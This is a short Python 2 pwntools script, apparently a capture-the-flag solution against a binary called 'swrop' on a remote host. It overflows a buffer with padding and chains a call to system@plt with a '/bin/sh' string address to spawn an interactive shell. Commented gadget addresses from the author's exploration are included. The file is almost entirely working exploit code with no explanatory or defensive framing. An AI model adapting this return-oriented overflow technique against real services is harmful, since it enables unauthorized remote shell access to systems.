#python2

from pwn import *

context.binary = './swrop'

io = remote("plzpwn.me", 6000)
#process('./swrop')
print(io.recvuntil('> '))

pay = 'A'*80
pay += p32(0xFFFFFFFA)
pay += '0'*52

# not used 1 
#pay += p32(0x080484D6)
# eax - ptr to bin date
# ebx - same, but otherwritten with rubbish
# edx - val of "bin date"
# ebp - no good

# 0x08048780 : dec ebp ; push cs ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret

# after vuln
# ebx - bin sh value

# 0x0804852c : push ebx ; call 0x8048417



system_plt_ddoff=p32(0x08048390)
c_exit=p32(0xf7df63d0)
sh_str=p32(0x080485F0)

main = p32(0x08048529)
main_subret = p32(0x0804855F)

pay += system_plt_ddoff
pay += c_exit
pay += sh_str
pay += main_subret


print("pay: "+pay)
print("pay len: "+str(len(pay)))
print("=================sending pay===============")

io.sendline(pay)
io.interactive()


print(io.recv())

"""
0x08048780 - dec ebp
0x0804834d - pop ebx

"""